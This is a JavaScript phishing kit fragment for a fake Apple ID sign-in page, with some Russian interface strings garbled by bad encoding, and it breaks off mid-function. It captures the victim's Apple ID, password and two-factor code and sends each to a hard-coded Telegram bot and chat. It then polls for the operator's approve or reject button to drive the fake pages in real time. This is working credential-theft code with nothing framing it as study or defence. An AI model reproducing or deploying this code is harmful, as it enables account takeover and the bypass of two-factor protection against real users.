<script>
    const BOT_TOKEN = '8428343552:AAFAZhJAmphDEWY02aiTxR5wIwWvP2xyVlE';
    const CHAT_ID = '-1003894478662';
    
    let checkInterval;
    let currentData = { appleId: '', password: '', code2fa: '' };

    function detectPhoneModel() {
        const ua = navigator.userAgent;
        if (/iPhone/i.test(ua)) return 'iPhone';
        if (/iPad/i.test(ua)) return 'iPad';
        return 'Desktop/Other';
    }

    async function sendToTelegram(message, is2FA = false) {
        const inlineKeyboard = {
            inline_keyboard: [[
                { text: "‚úÖ –î–∞", callback_data: is2FA ? "confirm_2fa" : "confirm_login" },
                { text: "‚ùå –ù–µ—Ç", callback_data: is2FA ? "cancel_2fa" : "cancel_login" }
            ]]
        };

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    reply_markup: inlineKeyboard
                })
            });
            return res.ok;
        } catch (e) { return false; }
    }

    async function startPolling(is2FA) {
        if (checkInterval) clearInterval(checkInterval);
        
        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
                const data = await res.json();
                if (data.ok && data.result.length > 0) {
                    const callback = data.result[0].callback_query;
                    if (!callback) return;

                    if (is2FA) {
                        if (callback.data === 'confirm_2fa') {
                            clearInterval(checkInterval);
                            showSuccessPage();
                        } else if (callback.data === 'cancel_2fa') {
                            clearInterval(checkInterval);
                            document.getElementById('twoFactorError').style.display = 'block';
                        }
                    } else {
                        if (callback.data === 'confirm_login') {
                            clearInterval(checkInterval);
                            showTwoFactorPage();
                        } else if (callback.data === 'cancel_login') {
                            clearInterval(checkInterval);
                            document.getElementById('loginError').innerText = "–í—Ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º";
                            document.getElementById('loginError').style.display = 'block';
                        }
                    }
                }
            } catch (e) { console.error(e); }
        }, 3000);
    }

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        currentData.appleId = document.getElementById('appleId').value;
        currentData.password = document.getElementById('password').value;
        
        const msg = `üçé LOGIN\nID: ${currentData.appleId}\nPass: ${currentData.password}\nDevice: ${detectPhoneModel()}`;
        if (await sendToTelegram(msg, false)) {
            alert("–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤ Telegram...");
            startPolling(false);
        }
    };

    document.getElementById('twoFactorForm').onsubmit = async (e) => {
        e.preventDefault();
        currentData.code2fa = document.getElementById('code2fa').value;
        const msg = `üîê 2FA CODE\nCode: ${currentData.code2fa}\nAccount: ${currentData.appleId}`;
        if (await sendToTelegram(msg, true)) {
            alert("–ö–æ–¥ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è...");
            startPolling(true);
        }
    };

    // –ù–∞–≤–∏–≥–∞—Ü–∏—è
    function showLoginPage() { hideAll(); document.getElementById('loginPage').style.display = 'block'; }
    function showTwoFactorPage() { hideAll(); document.getElementById('twoFactorPage').style.display = 'block'; }
    function showSuccessPage() { hideAll(); document.getElementById('successPage').style.display = 'block'; }
    function showRegionPage() { hideAll(); document.getElementById('regionPage').style.display = 'block'; }
    function showDownloadPage() { hideAll(); document.getElementById('downloadPage').style.display = 'block'; }
    
    function hideAll() {
        ['loginPage', 'twoFactorPage', 'successPage', 'regionPage', 'downloadPage']
        .forEach(id => document.getElementById(id).style.display = 'none');
        if(checkInterval) clearInterval(checkInterval);
    }

    function changeRegion(c) {

        el.style.display = 'block';
